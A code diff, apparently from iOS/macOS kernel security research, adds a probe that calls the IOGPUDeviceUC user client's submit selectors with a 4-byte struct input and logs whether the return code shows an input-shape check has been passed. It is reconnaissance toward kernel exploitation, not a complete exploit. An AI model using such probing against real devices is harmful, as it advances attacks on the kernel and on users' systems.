@@ -208,6 +208,31 @@ static void p143_bandit(const char *outcome) {
             }
         }
     }
+    /* ---- v6: the 27.x-layout law (24A435 decompile) ----
+       IOGPUDeviceUC_QueueCreate reads structureOutput at args+0x58 ⇒ the
+       shifted IOExternalMethodArguments layout ⇒ structureInputSize is at
+       args+0x28 — the exact field the submit's no-OOL branch compares to 4.
+       v5's stride ladder (0x20..0x48) could NEVER pass it. v6: structIn =
+       EXACTLY 4 bytes = {resourceId = qid} on BOTH submit sels (0x19 as
+       v5's row and 0x24 per the static UC contract), scalar counts 0 and 4.
+       Any kr other than 2c2 = the shape gate crossed. */
+    if (ourQid) {
+        uint32_t v4in = (uint32_t)ourQid;
+        for (int si = 0; si < 2; si++) {
+            uint32_t selx = si ? 0x24 : 0x19;
+            for (int nsc = 0; nsc <= 4; nsc += 4) {
+                uint64_t sc[4] = { ourQid, 1, 1, 0 };
+                uint64_t o6[4]; memset(o6, 0, sizeof o6);
+                uint32_t no6 = 4;
+                kern_return_t kr6 = call(conn, selx, nsc ? sc : NULL, (uint32_t)nsc,
+                                         &v4in, 4, o6, &no6, NULL, NULL);
+                Lf(@"[3c] v6 sz=4 sel-0x%x nsc=%d qid=%llu kr=0x%08x out0=0x%llx%@",
+                   selx, nsc, (unsigned long long)ourQid, (unsigned)kr6,
+                   (unsigned long long)o6[0],
+                   kr6 != 0xe00002c2 ? @" <== SHAPE GATE CROSSED" : @"");
+            }
+        }
+    }
     L(@"[3] the door's real gate = the INPUT shape: kind=4 + variable");
     L(@"    struct-in (the cmdBufArgSize/total-overflow assert laws = the");
     L(@"    struct-carrying call = v3's row; the empty-in = the census).");
